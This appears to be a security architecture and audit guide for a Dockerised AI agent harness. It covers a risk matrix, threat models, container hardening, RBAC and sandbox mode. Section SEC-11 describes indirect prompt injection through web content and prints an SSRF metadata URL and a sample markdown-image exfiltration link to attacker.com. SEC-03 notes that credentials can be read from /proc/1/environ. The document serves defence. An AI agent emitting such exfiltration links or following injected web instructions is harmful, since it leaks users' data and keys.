# 🔒 Security Architecture & Security Audit

> 🏛️ **SOTA Specification**: For the 5-Pillar theoretical model, NIST AI RMF, and OWASP Top 10 for LLMs compliance mapping, see **[SOTA AI Harness Architecture](ai-harness-architecture-sota.md)**.

DeepSeek Harness within this Docker stack is designed with multi-layered defensive security controls to protect host files, sensitive credentials, and telemetry traces.

This document serves as both the **Security Architecture Guide** and the **Security Audit Reference**, tracking threat models, known risks, and hardening guidelines.

---

## 🛡️ Executive Summary & Security Posture

* **Overall Posture**: **GOOD** for local, single-developer environments; **REQUIRES SANDBOX OVERRIDE** when evaluating untrusted code or running multi-tenant hosts.
* **Network Isolation**: All exposed endpoints (`3080` for DSH Web UI, `6006` for Arize Phoenix) bind strictly to loopback (`127.0.0.1`), preventing external LAN/WAN network exposure.
* **Supply Chain Security**: Base images derive directly from official `node:24-bookworm-slim` with `@deepseek-ai/dsh` installed from official npm, eliminating third-party Docker Hub intermediaries and pinning SHA256 digests.
* **Data Sovereignty**: Observability (Arize Phoenix) runs 100% on-premise; no prompt traces or completion tokens egress to third-party cloud vendors.

---

## 📊 Vulnerability & Risk Matrix (Security Audit)

| ID | Category | Severity | Finding | Status / Remediation |
| :--- | :--- | :---: | :--- | :--- |
| **SEC-01** | **Access Control** | **HIGH** | Unauthenticated Web UI & Telemetry Endpoints | Mitigated on host network via loopback (`127.0.0.1`). Use reverse proxy with auth for remote access. |
| **SEC-02** | **Container Isolation** | **PASS** | Container Execution Privileges & Host Mount Segregation | Remediated in all modes: default unprivileged user `dsh:dsh` (UID 1000), `cap_drop: [ALL]`, `no-new-privileges`, `/etc/dsh:ro`, `/var/lib/dsh:rw`, cgroup limits (`2 CPU`, `4GB RAM`, `512 PIDs`), and dev mount isolation ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-03** | **Credential Security** | **PASS** | API Keys Injected via Process Environment | Controlled via `chmod 0600 .env` in standard mode. In sandbox mode (`docker-compose.sandbox.yml`), all provider API keys and tokens are explicitly blanked/overridden with empty values ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-04** | **Least Privilege** | **MEDIUM** | GitHub MCP Server Blast Radius | Restrict GitHub Personal Access Tokens to fine-grained repository scopes. |
| **SEC-05** | **Data Privacy** | **LOW** | Full Prompt & Response Tracing in Phoenix Telemetry | 100% on-premise storage. Switch to `DSH_TELEMETRY_MODE=METRICS_ONLY` for sensitive datasets. |
| **SEC-06** | **Supply Chain** | **PASS** | Zero-Trust Base Image & Official Package Provenance | Built from official `node:24-bookworm-slim`; prebuilt with compilers stripped (`make`, `g++` purged) from runtime runner stage; dependencies pinned via `--frozen-lockfile` ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-07** | **Zero Trust RBAC** | **PASS** | Cross-Persona Escalation & Host Script Execution | Remediated via declarative `rbac:` contracts and in-line `@dsh-dds/core` PEP blocking unauthorized tools ([ADR 0001](adr/0001-build-time-immutability-and-rbac.md), [ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
| **SEC-08** | **Immutability** | **PASS** | Runtime Monkey-Patching Configuration Drift | Remediated via native `pnpm.patchedDependencies` and `@dsh-dds/core` Cordis plugin; zero runtime monkey-patch scripts ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
| **SEC-09** | **Filesystem Boundaries** | **PASS** | Symlink Traversal Pivots & Directory Escape | Remediated via `canonicalizeWithAncestorRealpath()` and `checkSymlinkEscape()` in `config/rbac-policy.mjs` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
| **SEC-10** | **Execution Boundary** | **PASS** | Ambient Host Execution Fallback in CLI | Remediated via fail-closed in-container execution dispatch in `dsh.sh` ([ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md)). |
| **SEC-11** | **Web Agent Confinement** | **PASS** | Indirect Prompt Injection & Cloud Metadata SSRF | Sanitized `mcp-fetch` text conversion, exfiltration stripping, and zero-egress sandbox profile. |
| **SEC-12** | **Threat Model Demarcation** | **PASS** | Boundary Confusion between Node PEP and Kernel Sandbox | Explicitly demarcated: `loader.mjs` is an internal engine PEP shim; process containment is enforced by Linux kernel cgroups, namespaces, Landlock LSM, and read-only rootfs ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-13** | **Cryptographic Integrity** | **PASS** | Default BYOK Master Key Fallback | Remediated: fail-closed master key enforcement (`DSH_VAULT_MASTER_KEY >= 32` chars), payload v2 format, 64KB body limit ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
| **SEC-14** | **Identity Spoofing** | **PASS** | Unvalidated Header Trust in Reverse Proxy Mode | Remediated: `x-dsh-user-id` and `x-dsh-user-roles` require `DSH_TRUST_PROXY_HEADERS=true` and trusted socket peer validation via `isTrustedGatewayIp()`; JWT pinned to `HS256` ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
| **SEC-15** | **Policy Enforcement** | **PASS** | PEP Tool-to-Action Namespace Gap & Fail-Open Fallback | Remediated: `TOOL_ACTION_MAP` deterministically translates tools to policy verbs (`bash` -> `run_shell`) with prototype isolation and toolName precedence; policy engine failure strictly fails closed; shell commands are evaluated against deny patterns rather than path allowlists; sandbox `/run` is hardened (`mode=0770`); web-search enforces HTTPS and domain restrictions ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
| **SEC-16** | **Host Immutability** | **PASS** | In-Container Code Modification by Agent Process | Remediated: `/app` directory owned by `root:root` with `0755` permissions, preventing unprivileged `dsh:dsh` agent from tampering with loader or PEP code ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |

---

## 🔍 Detailed Audit Findings

### 1. [SEC-01] Access Control & Localhost Endpoints
* **Threat Model**:
  - DSH Web Workbench (`http://localhost:3080`) and Arize Phoenix (`http://localhost:6006`) do not implement multi-tenant enterprise authentication out of the box.
  - While recent upstream versions introduced single-user browser tokens, exposing these ports across `0.0.0.0` or public interfaces exposes the agent to DNS-rebinding, Cross-Site Request Forgery (CSRF), and unauthorized tool execution.
  - Any local untrusted process or malicious browser tab executing cross-origin requests on the host could interact with the agent or exfiltrate Arize Phoenix telemetry.
* **Hardening Guideline**:
  - **Loopback Enforcement**: In `docker-compose.yml`, both `3080` and `6006` are strictly bound to `127.0.0.1`, preventing exposure across local area networks (LAN) or public interfaces.
  - **Secure Remote Access**: If remote access is required, **never expose raw ports to the Internet**. Deploy an authenticated, encrypted transport layer such as **Tailscale**, **Cloudflare Access Tunnels**, or a reverse proxy (Caddy / Nginx) enforcing OAuth2/OIDC authentication.

### 2. [SEC-02] Process Privileges & Host Configuration Mount (Remediated)
* **Threat Model & Prior Vulnerability**:
  - Prior architectures executed as `root` (UID 0) and mounted `./config` as read-write, risking host file clobbering and container escape.
* **Hardened Architecture & Remediation ([ADR 0006](adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
  - **Non-Root Service Execution**: Both `dsh` and `phoenix` run as dedicated service account `dsh:dsh` (UID/GID 1000).
  - **Kernel Privilege Stripping**: `cap_drop: [ALL]` drops all Linux capabilities; `security_opt: [no-new-privileges:true]` blocks privilege escalation.
  - **Resource Cgroups**: Standard mode enforces `cpus: '2.0'`, `memory: 4096M`, and `pids: 512` to prevent host exhaustion. Sandbox mode tightens this to `cpus: '2.0'`, `memory: 2048M`, and `pids: 150`.
  - **Linux FHS Segregation**: `./config` is mounted strictly read-only at `/etc/dsh:ro`. Stateful data is mounted to `/var/lib/dsh:rw`, and profiles use sticky `mode=1777` tmpfs.
  - **Production Immutability**: Development live mounts (`@dsh-dds/core` and `entrypoint.sh`) are segregated into `docker-compose.dev.yml`; standard mode runs purely from immutable container images.
  - **Sandbox Hardening**: For evaluation of untrusted agent workflows, launch with the sandbox override for read-only root filesystems, credential blanking, and isolated named volume session state:
    ```bash
    docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
    ```

### 3. [SEC-03] Credential Security in Container Environment
* **Threat Model**:
  - Sensitive frontier keys (`OPENROUTER_API_KEY`, `GEMINI_API_KEY`, `GITHUB_PERSONAL_ACCESS_TOKEN`) are injected into the container as environment variables in standard mode.
  - Any shell tool or subprocess executed within the container can read `/proc/1/environ` or run `printenv`.
* **Hardening Guideline & Remediation ([ADR 0008](adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
  - The turnkey installer enforces `chmod 0600 $DSH_INSTALL/.env` to prevent unauthorized local file reads.
  - In **Sandbox Mode** (`docker-compose.sandbox.yml`), all provider API keys and tokens are explicitly blanked out (`OPENROUTER_API_KEY=`, `GEMINI_API_KEY=`, etc.), preventing credential theft or unauthorized API consumption by untrusted evaluated code.
  - Avoid sharing execution logs or terminal sessions that output environment variables.
  - Configure spending quotas and rate limits on provider dashboards (OpenRouter FinOps / Google AI Studio).

### 4. [SEC-04] GitHub MCP Server Least Privilege
* **Threat Model**:
  - The official `github-mcp-server` has capabilities to create branches, push code, and update issues and PRs.
  - Supplying a classic GitHub PAT with full `repo` or `admin:org` scope grants the agent excessive write access across all your personal and organization repositories.
* **Hardening Guideline**:
  - Generate a **Fine-Grained Personal Access Token (Beta)** restricted to **Only select repositories**.
  - Grant only *Contents: Read and write* and *Pull requests: Read and write*. Deny repository administration, workflow management, and delete rights.

### 5. [SEC-05] Observability & Telemetry Retention (Data Sovereignty & Cloud APIs)
* **Threat Model**:
  - `DSH_TELEMETRY_MODE=FULL` streams entire multi-turn conversation transcripts, system prompts, tool call parameters, and model reasoning blocks into Arize Phoenix (`./config/phoenix`).
  - If processing confidential files or proprietary datasets, these artifacts persist in local SQLite/parquet databases.
* **Data Sovereignty Boundary & Cloud API Nuance**:
  - **Local Telemetry Invariant**: All telemetry data, span waterfalls, and GRC audit records (`audit_grc.jsonl`) remain 100% on-premise on the host machine. Unlike SaaS agent observability platforms (e.g., LangSmith, Datadog, AgentOps), zero trace data or prompt history is exported to external servers.
  - **Cloud Model API Egress**: When configured to use external cloud LLM providers (e.g. OpenRouter, DeepSeek API, Anthropic Claude, Google Gemini), prompts, file snippets, and tool outputs necessarily transit over TLS to the respective model provider's cloud inference endpoints.
  - **100% Air-Gapped Sovereign Alternative**: For regulated, defense, or high-compliance environments (GDPR Art. 9, HIPAA), pair DSH-DDS with local on-premise model backends (Ollama, vLLM, llama.cpp, LocalAI) or private VPC inference endpoints. Under this configuration, the entire agent lifecycle operates with **absolute zero data egress**.
* **Hardening Guideline**:
  - If processing sensitive or non-redactable code, configure in `.env`:
    ```env
    DSH_TELEMETRY_MODE=METRICS_ONLY
    ```
  - Periodically prune or wipe telemetry data:
    ```bash
    rm -rf config/phoenix/*
    ```

### 6. [SEC-07] Zero Trust Identity Isolation & Persona RBAC
* **Threat Model**:
  - Containerization isolates the Docker host from the container, but does not isolate personas from each other.
  - A prompt-injected or compromised persona (e.g. `data-analyst` handling untrusted CSV/SQL) could attempt to read credentials, mutate skills of `security-auditor`, or trigger administrative scripts (`reset.sh`, `install_dsh.sh`).
* **Hardening Guideline & Enforcement**:
  - Every persona manifest (`persona.yaml`) declares a strict `rbac:` policy specifying allowed roles, readable/writable filesystem paths, allowed MCP tools, and explicit `deny` paths.
  - The authoritative policy engine in `config/rbac-policy.mjs` (`enforceRbacPolicy()`) intercepts every workflow step prior to execution, performs directory containment checks (`isContainedWithin`), checks for escaping symlinks (`checkSymlinkEscape`), and fails closed if a target matches a deny pattern or exceeds authorization.
  - See [ADR 0001](adr/0001-build-time-immutability-and-rbac.md), [ADR 0004](adr/0004-in-container-boundaries-and-strict-directory-containment.md), and [ADR 0005](adr/0005-remediation-of-audit-v3-findings.md).

### 7. [SEC-08] Build-Time Immutability vs. Runtime Monkey-Patching
* **Threat Model**:
  - Dynamically applying code patches in `docker/entrypoint.sh` at container startup introduces non-reproducibility, drift, and divergence between Git state and in-memory application state.
* **Hardening Guideline & Enforcement**:
  - All compatibility shims (`pi-ai` thought-signature preservation and `dsh-bash-local` Landlock auto-workdir creation) are compiled directly into the Docker image layers at build time (`RUN`).
  - `docker/entrypoint.sh` is strictly read-only regarding application code; zero dynamic string mutations or regex patchers execute at container boot.

### 8. [GRC-01] Immutable GRC Audit Trail (`audit_grc.jsonl`)
* **Governance Standard**:
  - Enterprise compliance frameworks (EU AI Act, SOC 2, ISO 27001) require verifiable audit trails of autonomous agent decisions.
  - Every authorization check is appended as a structured JSON Lines record to `/var/lib/dsh/audit/audit_grc.jsonl` (persisted to the host at `./config/audit/audit_grc.jsonl` across all run modes, including sandbox):
    ```json
    {
      "timestamp": "2026-09-03T01:32:22.185Z",
      "event_type": "GRC_AUTHORIZATION_DECISION",
      "persona": "data-analyst",
      "workflow": "analyze_pipeline",
      "step_index": 1,
      "step_name": "Profile Relational Datasets",
      "action": "inspect_sqlite",
      "target": "/workspaces/data.db",
      "decision": "GRANTED",
      "role": "data_analyst",
      "reason": "Policy validated"
    }
    ```

### 11. [SEC-11] Web Browsing Agents & External Data Ingestion Risks
* **Threat Model**:
  - Web-browsing agents (e.g., using `mcp-fetch` or web search tools) ingest untrusted external HTML/DOM, introducing **Indirect Prompt Injection** (malicious hidden instructions hijacking agent control flow).
  - An attacker could trick the agent into performing **Server-Side Request Forgery (SSRF)** against cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`) or private internal networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
  - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
* **Hardening Guideline & Mitigations**:
  - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
  - **Zero-Egress Isolation**: When auditing unverified third-party repositories or processing untrusted links, execute using `docker-compose.sandbox.yml` with `internal: true` to prevent network exfiltration.
  - **Host Loopback Protection**: Critical host services (DSH UI and Arize Phoenix) bind strictly to `127.0.0.1`, which is unreachable from within default Docker bridge containers without explicit routing.

### 12. [SEC-13] Cryptographic Integrity & Fail-Closed BYOK Vault
* **Threat Model & Prior Vulnerability**:
  - `packages/dsh-dds-core/byok-vault.js` fell back to a default constant string when `DSH_VAULT_MASTER_KEY` was missing, leaving encrypted user API keys vulnerable to decryption with public repository knowledge.
* **Remediation & Hardening ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - `ByokVault` strictly requires `DSH_VAULT_MASTER_KEY >= 32` characters; missing or short secrets fail closed with `VAULT_MASTER_KEY_MISSING`.
  - Payloads upgraded to `version: 2`; `decryptSecret` refuses legacy v1 blobs.
  - REST API `/dsh-dds/api/vault/keys` enforces a 64 KB maximum payload limit and socket destruction on overflow.
  - Turnkey installer automatically generates a 32-byte hex secret during `.env` creation; `./dsh.sh doctor` reports hard failure if key is absent.

### 13. [SEC-14] Identity Spoofing & Gateway Peer Verification
* **Threat Model & Prior Vulnerability**:
  - Reverse proxy identity headers (`x-dsh-user-id`, `x-dsh-user-roles: admin`) were accepted without checking the requesting socket peer address.
* **Remediation & Hardening ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - Extracted network peer trust verification into `packages/dsh-dds-core/net-trust.js`.
  - Reverse proxy headers are ignored unless `DSH_TRUST_PROXY_HEADERS=true` and `isTrustedGatewayIp(remoteAddress)` verifies the caller is loopback or an internal Docker bridge.
  - JWT bearer token authentication strictly enforces `alg: HS256`.

### 14. [SEC-15] Zero-Trust PEP Action Mapping & Fail-Closed Identity
* **Threat Model & Prior Vulnerability**:
  - Raw tool names (`bash`, `write_file`, `edit_file`) diverged from declarative workflow verbs (`run_shell`, `create_file`, `modify_file`), resulting in unmapped actions defaulting to unclassified execution.
  - In-line PEP granted admin role when caller user context was omitted.
* **Remediation & Hardening ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - `TOOL_ACTION_MAP` maps agent tool names directly to policy verbs.
  - `run_shell` is classified as a write action in `config/rbac-policy.mjs`, enforcing strict directory boundaries on shell operations.
  - Missing identity context immediately fails closed with `[Zero-Trust RBAC Violation] Missing authenticated user identity context`.
  - Multi-tenant boundary checks normalize all string targets against `/workspaces/users/<userId>` and `/workspaces/shared`.

### 15. [SEC-16] Container Application Code Immutability
* **Threat Model & Prior Vulnerability**:
  - Although the process executed as unprivileged `dsh:dsh` (UID 1000), `dsh` owned `/app`, allowing an in-container compromise to rewrite `NODE_OPTIONS` loader shims or policy enforcement points.
* **Remediation & Hardening ([ADR 0009](adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - In `Dockerfile`, `/app` is chowned to `root:root` with permissions `chmod -R 755 /app`.
  - The runtime process (`dsh:dsh`) can read and execute application files, but cannot modify in-memory interception or policy validation code on disk.

---

## 🛡️ Hardened Sandbox Mode (`docker-compose.sandbox.yml`)

When using DSH to analyze external or unverified code repositories, start with the sandbox override:

```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
```

### Sandbox Protections Matrix

| Control | Standard Mode (`docker-compose.yml`) | Sandbox Mode (`sandbox.yml`) | Development Mode (`docker-compose.dev.yml`) |
| :--- | :--- | :--- | :--- |
| **Root Filesystem** | Writable | **Read-Only (`read_only: true`)** | Writable |
| **Linux Capabilities** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** | **All Dropped (`cap_drop: ALL`)** |
| **Privilege Escalation** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** |
| **Host Config Mount** | **Read-Only (`./config:/etc/dsh:ro`)** | **Read-Only (`./config:/opt/dsh-config:ro`)** | **Read-Only (`./config:/etc/dsh:ro`)** |
| **Workspace Mount** | Read-Write (`./workspaces`) | **Read-Only (`./workspaces:ro`)** | Read-Write (`./workspaces`) |
| **GRC Audit Retention** | **Persisted (`./config/audit:/var/lib/dsh/audit:rw`)** | **Persisted (`./config/audit:/var/lib/dsh/audit:rw`)** | **Persisted (`./config/audit:/var/lib/dsh/audit:rw`)** |
| **Session & State Storage** | Persisted on host (`./config/sessions`, `./config/storages`) | **Isolated Named Volume (`sandbox-session-state:/var/lib/dsh-state:rw`)** | Persisted on host |
| **Container Networking** | Bridge (Host DNS / Internet) | **Zero-Direct Egress (`dsh-internal` bridge through `egress-filter` Envoy sidecar)** | Bridge |
| **Resource Constraints** | **Limits (`2.0 CPUs`, `4GB RAM`, `512 PIDs`)** | **Strict Limits (`2.0 CPUs`, `2GB RAM`, `150 PIDs`)** | Inherits standard limits |
| **Provider Credentials** | Injected via `.env` | **Explicitly Blanked (`dummy / empty`)** | Injected via `.env` |
| **Developer Code Mounts** | **None (Immutable Image)** | **None (Immutable Image)** | **Live Mounts (`@dsh-dds/core`, `entrypoint.sh`)** |
| **Compilers in Image** | **Purged (`make`, `g++` stripped)** | **Purged (`make`, `g++` stripped)** | Purged in runner stage |

To destroy all transient sandbox session data:
```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml down -v
```

---

## ⚠️ Mandatory Plugin & Supply Chain Auditing Policy

Plugins and MCP tool servers in DeepSeek Harness execute directly within the Node.js container runtime with full access to mounted workspaces, environment variables, and system tools.

### Why Every Added Plugin Must Be Audited
* **In-Process Runtime Execution**: DSH plugins load as dynamic Node.js/Cordis modules. An unvetted or malicious plugin executes with the same privileges as the agent itself.
* **Credential Protection**: Although environment variables are protected from external network traffic, any in-process plugin can access `process.env` (including `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, and `GITHUB_PERSONAL_ACCESS_TOKEN`).
* **Supply Chain Attack Vectors**: Third-party npm packages can introduce compromised lifecycle scripts (`preinstall`, `postinstall`), unvetted transitive dependencies, or covert data-exfiltration logic.

### Pre-Installation Audit Checklist
Before adding any community plugin to `config/profiles/web/package.json` or installing via `dshmarket`:
1. **Source Code Inspection**: Review the plugin's source repository for obfuscated code, arbitrary `eval()`, or unexpected HTTP/WebSocket outbound connections.
2. **Lifecycle Scripts Verification**: Ensure the package's `package.json` does not declare suspicious `preinstall`, `install`, or `postinstall` hooks.
3. **Lockfile & Version Pinning**: Always pin strict versions in `package.json` and verify that dependencies resolve deterministically via `pnpm-lock.yaml`.
4. **Static Sandbox Policy**: When evaluating untrusted external code, never install new or unverified plugins dynamically; keep the plugin set minimal, fixed, and fully vetted.

---

## 📋 Security Best Practices Checklist

- [x] Ensure `.env` is never committed to Git (verified in `.gitignore`).
- [x] Keep `.env` permissions set to `0600` (`chmod 0600 .env`).
- [x] Use fine-grained GitHub PATs scoped strictly to individual repositories.
- [x] Enforce `docker-compose.sandbox.yml` when handling untrusted code or external inputs.
- [x] Thoroughly audit all third-party plugins and MCP servers before adding them to the environment.
- [x] Set spending caps on API provider accounts to prevent FinOps anomalies.
- [x] Run `./dsh.sh doctor` to regularly audit credentials, permissions, and network bindings.
